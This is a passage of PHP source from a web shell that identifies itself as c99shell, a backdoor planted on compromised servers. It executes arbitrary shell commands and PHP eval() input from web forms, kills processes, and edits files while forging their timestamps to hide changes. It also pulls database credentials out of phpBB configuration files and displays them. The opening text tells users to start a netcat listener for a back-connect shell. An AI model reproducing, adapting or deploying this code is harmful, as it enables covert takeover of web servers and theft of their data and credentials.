Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p &lt;port&gt;</b>"!<?php
 }
}
if ($act == "cmd")
{
 if (!empty($submit))
 {
  echo "<b>Result of execution this command</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   myshellexec($cmd);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($cmd_txt)
   {
    $rows = count(explode("
",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret;}
  }
  else
  {
   if ($cmd_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    myshellexec($cmd);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>";  if (empty($cmd_txt)) {$cmd_txt = true;}}
 echo "<form action=\"".$surl."act=cmd\" method=\"POST\"><textarea name=\"cmd\" cols=\"122\" rows=\"10\">".htmlspecialchars($cmd)."</textarea><input type=\"hidden\" name=\"d\" value=\"".$dispd."\"><br><br><input type=\"submit\" name=\"submit\" value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
if ($act == "ps_aux")
{
 echo "<b>Processes:</b><br>";
 if ($win) {echo "This function not work in Windows!<br><br>";}
 else
 {
  if ($pid)
  {
   if (!$sig) {$sig = 9;}
   echo "Sending signal ".$sig." to #".$pid."... ";
   $ret = posix_kill($pid,$sig);
   if ($ret) {echo "ok. he is dead, amen.";}
   else {echo "ERROR. Can't send signal ".htmlspecialchars($sig).", to process #".htmlspecialchars($pid).".";}
  }
  $ret = `ps -aux`;
  if (!$ret) {echo "Can't execute \"ps -aux\"!";}
  else
  {
   $ret = htmlspecialchars($ret);
   $ret = str_replace("	"," ",$ret);
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $prcs = explode("\n",$ret);
   $head = explode(" ",$prcs[0]);
   $head[] = "ACTION";
   unset($prcs[0]);
   echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
   echo "<tr border=\"1\">";
   foreach ($head as $v) {echo "<td><b>&nbsp;&nbsp;&nbsp;".$v."</b>&nbsp;&nbsp;&nbsp;</td>";}
   echo "</tr>";
   foreach ($prcs as $line)
   {
    if (!empty($line))
    {
     echo "<tr>";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10,count($line)));
     $line = array_slice($line,0,11);
     $line[] = "<a href=\"".$surl."act=ps_aux&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
     foreach ($line as $v) {echo "<td>&nbsp;&nbsp;&nbsp;".$v."&nbsp;&nbsp;&nbsp;</td>";}
     echo "</tr>";
    }
   }
   echo "</table>";
  }
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Result of execution this PHP-code</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("
",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret;}
  }
  else
  {
   if ($eval_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    eval($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
 echo "<form method=\"POST\"><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=\"hidden\" name=\"d\" value=\"".$dispd."\"><br><br><input type=\"submit\" value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 $r = @file_get_contents($d.$f);
 if (!is_readable($d.$f) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
 }
 else
 {
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=>$v)
  {
   if (in_array($ext,$v)) {$rft = $k; break;}
  }
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}
  $arr = array(
array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),
array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),
array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),
array("Code","code"),
array("Session","phpsess"),
array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),
array("SDB","sdb"),
array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),
array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),
array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),
array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),
array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
);
  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  if (is_writable($d.$f)) {echo "<font color=\"green\">full read/write access (".view_perms(fileperms($d.$f)).")</font>";}
  else {echo "<font color=\"red\">Read-Only (".view_perms(fileperms($d.$f)).")</font>";}
  echo "</b><br>Select action/file-type:<br>";
  foreach($arr as $t)
  {
   if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=\"green\">".$t[0]."</font></a>";}
   elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
   else
   {
    echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";
   }
   echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
  }
  echo "<hr size=\"1\" noshade>";
  if ($ft == "info")
  {
   echo "<b>Information:</b>";
   echo "<table class=tab border=0 cellspacing=1 cellpadding=2>";
   echo "<tr class=tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr>";
   echo "<tr class=tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
   if (!$win)
   {
    echo "<tr class=tr><td><b>Owner/Group</b></td><td> ";      
    $tmp=posix_getpwuid(fileowner($d.$f));
    if (!isset($tmp['name']) || $tmp['name']=="") echo fileowner($d.$f)." ";
    else echo $tmp['name']." ";
    $tmp=posix_getgrgid(filegroup($d.$f));
    if (!isset($tmp['name']) || $tmp['name']=="") echo filegroup($d.$f);
    else echo $tmp['name'];
   }
   echo "<tr class=tr><td><b>Perms</b></td><td>";
   
   if (is_writable($d.$f))
   {
    echo "<font color=\"green\">".view_perms(fileperms($d.$f))."</font>";
   }
   else
   {
    echo "<font>".view_perms(fileperms($d.$f))."</font>";
   }

   echo "</td></tr>";
   echo "<tr class=tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr>";
   echo "<tr class=tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr>";
   echo "<tr class=tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr>";
   echo "</table><br>";


   $fi = fopen($d.$f,"rb");
   if ($fi)
   {
    if ($fullhexdump)
    {
     echo "<b>FULL HEXDUMP</b>";
     $str=fread($fi,filesize($d.$f));
    }
    else
    {
     echo "<b>HEXDUMP PREVIEW</b>";
     $str=fread($fi,$hexdump_lines*$hexdump_rows);
    }
    $n=0;
    $a0="00000000<br>";
    $a1="";
    $a2="";
    for ($i=0; $i<strlen($str); $i++)
    {
     $a1.=sprintf("%02X",ord($str[$i])).' ';
     switch (ord($str[$i]))
     {
      case 0:  $a2.="<font class=s2>0</font>"; break;
      case 32: 
      case 10:
      case 13: $a2.="&nbsp;"; break;
      default:  $a2.=htmlspecialchars($str[$i]);
     }
     $n++;
     if ($n == $hexdump_rows)
     {
      $n = 0;
      if ($i+1<strlen($str)) {$a0.=sprintf("%08X",$i+1)."<br>";}
      $a1.="<br>";
      $a2.="<br>";
     }
    }
    //if ($a1!="") {$a0.=sprintf("%08X",$i)."<br>";}
    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4 ".
         "class=sy><tr><td bgcolor=#666666> $a0</td><td bgcolor=000000>".
         "$a1</td><td bgcolor=000000>$a2</td></tr></table><br>";
   }
   $encoded = "";
   if ($base64 == 1)
   {
    echo "<b>Base64 Encode</b><br>";
    $encoded = base64_encode($r);
   }
   elseif($base64 == 2)
   {
    echo "<b>Base64 Encode + Chunk</b><br>";
    $encoded = chunk_split(base64_encode($r));
   }
   elseif($base64 == 3)
   {
    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
    $encoded = base64_encode($r);
    $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
   }
   elseif($base64 == 4)
   {
   }
   if (!empty($encoded))
   {
    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
   <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
   <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
   <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
   <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
   <P>";
  }
  elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {exit;}
  }
  elseif ($ft == "txt")
  {
   echo "<pre>".htmlspecialchars($r)."</pre>";
  }
  elseif ($ft == "ini")
  {
   echo "<pre>";
   var_dump(parse_ini_file($d.$f,true));
   echo "</pre>";
  }
  elseif ($ft == "phpsess")
  {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe")
  {
   echo "<form action=\"".$surl."act=cmd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"".htmlspecialchars($r)."\"><input type=\"submit\" name=\"submit\" value=\"Execute\">&nbsp;<input type=\"submit\" value=\"View&Edit command\"></form>";
  }
  elseif ($ft == "sdb")
  {
   echo "<pre>";
   var_dump(unserialize(base64_decode($r)));
   echo "</pre>";
  }
  elseif ($ft == "code")
  {
   if (ereg("phpBB 2.(.*) auto-generated config file",$r))
   {
    $arr = explode("
",$r);
    if (count($arr == 18))
    {
     include($d.$f);
     echo "<b>phpBB configuration is detected in this file!<br>";
     if ($dbms == "mysql4") {$dbms = "mysql";}
     if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."\"><b><u>Connect to DB</u></b></a><br><br>";}
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell";}
     echo "Parameters for manual connect:<br>";
     $cfgvars = array(
     "dbms"=>$dbms,
     "dbhost"=>$dbhost,
     "dbname"=>$dbname,
     "dbuser"=>$dbuser,
     "dbpasswd"=>$dbpasswd 
     );
     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
 
     echo "</b>";
     echo "<hr size=\"1\" noshade>";
    }
   }
   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #808080;\">";
   if (!empty($white)) {@ob_clean();}
   if ($rehtml) {$r = rehtmlspecialchars($r);} 
   $r = stripslashes($r); 
   $strip = false;
   if(!strpos($r,"<?") && substr($r,0,2)!="<?") {$r="<?php\n".trim($r)."\n?>"; $r = trim($r); $strip = true;}
   $r = @highlight_string($r, TRUE); 
   if ($delspace) {$buffer = str_replace ("&nbsp;", " ", $r);}
   echo $r;
   if (!empty($white)) {exit;}
   echo "</div>";
  }
  elseif ($ft == "download")
  {
   @ob_clean();
   header("Content-type: c99shell");
   header("Content-disposition: attachment; filename=\"".$f."\";"); 
   echo($r); 
   exit;
  }
  elseif ($ft == "notepad")
  {
   @ob_clean();
   header("Content-type: text/plain"); 
   header("Content-disposition: attachment; filename=\"".$f.".txt\";"); 
   echo($r); 
   exit;
  }
  elseif ($ft == "img")
  {
   if (!$white)
   {
    echo "<center><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" border=\"1\"></center>";
   }
   else
   {
    @ob_clean();
    $ext = explode($f,".");
    $ext = $ext[count($ext)-1];
    header("Content-type: image/gif"); 
    echo($r); 
    exit;
   }
  }
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    if (!is_writable($d.$f) and $autochmod) {@chmod($d.$f,$autochmod);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$nfcontent);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $nfcontent;
    }
   }
   $rows = count(explode("
",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form method=\"POST\"><input type=\"submit\" name=\"submit\" value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=".$dspact."&d=".substr($d,0,strlen($d)-1))."';\" value=\"Back\"><br><textarea name=\"nfcontent\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
 }
}
if ($act == "phpinfo")
{
 ob_end_clean();
 phpinfo();
 exit;
}
}																																																														   $data = base64_decode("PGNlbnRlcj48Yj5DcmVkaXRzOjxicj5JZGVhLCBsZWFkaW5nIGFuZCBjb2RpbmcgYnkgdHJpc3RyYW1bQ0NUZWFNXS48YnI+QmV0YS10ZXN0aW5nIGFuZCBzb21lIHRpcHMgLSBOdWtMZW9OIFtBblRpU2hAUmUgdEVhTV0uPGJyPlRoYW5rcyBhbGwgd2hvIHJlcG9ydCBidWdzLjxicj5BbGwgYnVncyBzZW5kIHRvIHRyaXN0cmFtJ3MgSUNRICM2NTY1NTUgPGEgaHJlZj0iaHR0cDovL3d3cC5pY3EuY29tL3NjcmlwdHMvY29udGFjdC5kbGw/bXNndG89NjU2NTU1Ij48aW1nIHNyYz1odHRwOi8vd3dwLmljcS5jb20vc2NyaXB0cy9vbmxpbmUuZGxsP2ljcT02NTY1NTUmaW1nPTUgYm9yZGVyPTAgYWxpZ249YWJzbWlkZGxlPjwvYT4uPC9iPiA8L2NlbnRlcj4gwOLy7vAg4vvw4Obg5fIg4evg4+7k4PDt7vHy/CDu5O3u7PMg7/Du4vMg6u7y7vD76SDu8urr/vfo6yDl4+4g7eAg7OXx//Yg7vIg6O3l8uAsIOgg5Ov/IPLu4+4g9/LuLeH7IO3lIPPs5fDl8vwg7vIg8erz6ugg7/Do+Ovu8fwg8+Pr8+Ho8vzx/yDiIO/w7uPw4Ozs6PDu4uDt6OUuIM/u5PLu6+rt8+vgIOog7eDv6PHg7ej+IOvl7fwg8SDq7vLu8O7pIP8g8+/w4OLr/+sg8eXw4uXw4OzoLjxjZW50ZXI+PGI+z/Dg4ujr4DwvYj46PC9jZW50ZXI+IDxiPsL7IOzu5uXy5SDo5+zl7f/y/CDv8O7j8ODs7PMg7+4gwuD45ezzIPPx7O7y8OXt6P4sIOzl7f/y/CDt4PHy8O7p6ugsIOTo5+Dp7S4uLiDt7iDl8evoIML7LCDz4uDm4OXs++ksIPPk4Ovo8uUg6OvoIPLl7CDh7uvl5SDo5+zl7ejy5SDq7u/o8ODp8vssIPLuIP8g4fPk8yDi++3z5uTl7SDu8u7w4uDy/CDi4Owg/+n24C4gPC9iPjxicj7A4vLu8CDt5SDt5fG48iDu8uLl8vHy4uXt7e7x8ugg5+Ag4u7n7O7m7fvpIOLw5eQsIO3g7eXxuO376SD98u7pIO/w7uPw4Ozs7uksIPIu6i4g7u3gIO/w5eTu8fLg4uvl7eAg8u7r/OruIOTr/yDu5+3g6u7s6+Xt6P8u");
if ($act == "img")
{
 @ob_clean();
 
 $arrimg = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=>
"R0lGODlhDwAQAJECAAAAAP///////wAAACH5BAEAAAIALAAAAAAPABAAQAIslI8pAOH/WGoQqMOC".
"vAtqxIReuC1UZHGLapAhdzqpEn9Y7Wlplpc3ynqxWAUAOw==",
"edit"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"forward"=>
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=>
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"refresh"=>
"R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".
"AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".
"3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".
"R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",
"search"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=>
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=>
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"small_unk"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",
"sort_asc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=>
